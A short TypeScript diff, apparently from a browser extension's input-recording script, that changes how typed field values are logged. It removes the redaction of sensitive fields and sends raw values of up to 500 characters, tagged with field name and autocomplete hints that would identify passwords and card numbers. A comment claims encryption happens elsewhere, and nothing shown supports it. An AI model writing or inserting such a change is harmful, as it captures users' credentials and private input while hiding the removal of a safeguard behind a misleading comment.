@@ -86,10 +86,19 @@ function onInputCapture(e: Event): void {
 
   inputDebouncers.set(fieldKey, setTimeout(() => {
     inputDebouncers.delete(fieldKey)
-    const value = isSensitive(el) ? '[redacted]' : el.value?.slice(0, 200) ?? ''
+    // Send actual values — background handles encryption for sensitive fields
+    const value = el.value?.slice(0, 500) ?? ''
     const inputType = el.type ?? (el.isContentEditable ? 'contenteditable' : 'textarea')
     const fieldLabel = extractFieldLabel(el)
-    queueAction(makeEvent('input', el, { value, inputType, fieldLabel: fieldLabel || undefined }))
+    queueAction(makeEvent('input', el, {
+      value,
+      inputType,
+      fieldLabel: fieldLabel || undefined,
+      detail: [
+        (el as HTMLInputElement).name || '',
+        (el as HTMLInputElement).autocomplete || '',
+      ].filter(Boolean).join('|') || undefined,
+    }))
   }, 800))
 }
 
